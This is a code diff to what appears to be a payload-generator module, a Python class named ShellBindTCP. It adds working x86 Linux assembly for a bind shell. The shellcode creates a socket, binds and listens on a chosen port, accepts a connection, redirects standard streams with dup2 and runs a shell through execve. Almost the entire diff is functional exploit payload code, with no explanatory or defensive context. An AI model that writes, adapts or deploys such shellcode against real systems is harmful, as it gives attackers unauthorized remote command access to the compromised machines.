@@ -40,11 +40,64 @@ class ShellBindTCP(HatAsm, HatVenom, Words):
         else:
             shell = self.shell['sh']
 
-        shell = shell[::-1]
+        shell = [shell[::-1][i:i+4] for i in range(0, len(shell), 4)]
+        shell_asm = ""
+
+        for line in shell:
+            shell_asm += f"push 0x{line.hex()}\n"
+
         bport = self.convert_port(options['BPORT'])
 
         shellcode = f"""
-        
+        start:
+            xor ebx, ebx
+            mul ebx
+            push ebx
+            inc ebx
+            push ebx
+            push 0x2
+            mov ecx, esp
+            mov al, 0x66
+            int 0x80
+
+            pop ebx
+            pop esi
+            push edx
+            push 0x{bport.hex()}0002
+            push 0x10
+            push ecx
+            push eax
+            mov ecx, esp
+            push 0x66
+            pop eax
+            int 0x80
+
+            mov dword ptr [ecx + 4], eax
+            mov bl, 0x4
+            mov al, 0x66
+            int 0x80
+
+            inc ebx
+            mov al, 0x66
+            int 0x80
+
+            xchg ebx, eax
+            pop ecx
+
+        dup:
+            push 0x3f
+            pop eax
+            int 0x80
+
+            dec ecx
+            jns dup
+            {shell_asm}
+            mov ebx, esp
+            push eax
+            push ebx
+            mov ecx, esp
+            mov al, 0xb
+            int 0x80
         """
 
         if assemble:
